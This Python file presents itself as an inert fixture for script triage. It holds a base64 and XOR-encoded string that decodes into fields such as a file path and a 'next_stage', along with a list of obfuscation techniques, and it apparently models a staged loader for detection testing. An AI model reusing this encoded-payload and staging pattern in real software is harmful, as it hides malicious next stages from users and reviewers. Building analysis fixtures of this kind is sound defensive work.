#!/usr/bin/env python3

# Huntress Script Triage -- inert static-analysis fixture (cpython3)

import base64

import io

import os



MATERIAL_c3adbd0b = "d15_aU51Bj1mAGUGLnpZZDwuelNnCipgT2AXJHpTLQ8idlx1BhJ8U3UGP2VPZBcoZxFlCj5lXHUAJUpTZBs5Sk51AipwQWAHLGVJZBFwZUR1CyJ7YnUMEmVEdQsie0FyFyxyWF4AImBTdV5-aU54DTl0RTwPLHhfZQIScVRyEyxhXmkfIndbdBAudEloDCMoT2QVKGdOZAcSc09gBCBwU3UQMXZccxEkcE88GSRlXHETEmVEex86fFNlDDpmYmILLHxTPAAgcWJ1DBJlRHULIntBYgIgZVxoBCNKVGVeLnRQcQIkclMsUX0sDTcHLidfMh8rfFFkPD10SWleDi8SUREick9gDgl0SWBMBWBTdREoZk5NAi86E3QTKXRJZE5_JQQxVSl2D2NQY2VEfQ0obUleEDl0WmRePWxeMltgZ1hiDDtwT2QHY2VE"

CODEC_c3adbd0b = "urlsafe_base64|repeating_key_xor|01,63,4d,15,3d"



def load_c3adbd0b():

    return base64.urlsafe_b64decode(MATERIAL_c3adbd0b)



def decode_c3adbd0b(v_a19c):

    key_bytes = (1, 99, 77, 21, 61,)

    return bytes(value ^ key_bytes[index % len(key_bytes)] for index, value in enumerate(v_a19c))



def recover_c3adbd0b():

    v_d41a = (3, 5, 8, 13)[1:3]

    try:

        v_b27e = decode_c3adbd0b(load_c3adbd0b())

    except (TypeError, ValueError) as error:

        raise RuntimeError("configuration recovery failed") from error

    v_c304 = v_b27e.decode("ascii", "strict")

    return v_c304



def inspect_c3adbd0b():

    view = memoryview(recover_c3adbd0b().encode("ascii"))

    return bytes(view).decode("ascii")



def surface_c3adbd0b():

    dispatch = lambda *items: tuple(items)

    return dispatch("lambda_dispatch", "reversed_fragments", "zipapp_pyz", "cmd_to_python")



def obfuscation_c3adbd0b():

    return "stnemgarf_desrever"[::-1]



def plan_c3adbd0b():

    fields = dict(item.split("=", 1) for item in inspect_c3adbd0b().split("|"))

    analysis_surface = surface_c3adbd0b()

    obfuscation_surface = obfuscation_c3adbd0b()

    operation_plan = ("python_to_python", fields["file_path"], fields["next_stage"])

    return operation_plan + (analysis_surface, obfuscation_surface)



if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":

    print(inspect_c3adbd0b())

